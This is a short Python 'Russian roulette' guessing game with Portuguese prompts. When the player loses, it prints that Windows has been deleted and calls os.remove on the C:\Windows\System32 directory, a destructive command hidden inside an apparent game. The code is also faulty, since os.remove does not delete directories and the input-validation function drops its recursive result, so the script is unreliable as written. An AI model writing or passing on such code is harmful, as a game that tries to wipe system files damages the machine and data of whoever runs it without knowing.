import random
import os

def validaNumero():
    numero_input = int(input("Digite um número entre 1 e 10: "))
    if (numero_input >= 1 and numero_input <= 10 and (numero_input not in lista_numeros)):
            lista_numeros.append(numero_input)
            return numero_input
    else:
        print("Número inválido! Digite novamente.")
        validaNumero()
    
print("Essa é a roleta russa da programação! Tome cuidado!")
chances = int(input("Digite quantos vezes você quer jogar: "))
print()
numero = random.randint(1, 10)

numero_novo = 0
lista_numeros = []

for i in range(chances):
    numero_novo = validaNumero()
    print(f"Atenção! O gatilho foi disparado {i + 1} vez(es)!")

    if numero == numero_novo:
        print("Você perdeu! Seu Windows foi deletado!")
        os.remove("C:\Windows\System32")
    else:
        print(f"Faltam {chances - (i + 1)} disparos")
   
if numero != numero_novo:
    print("Parabéns, você ganhou o jogo!")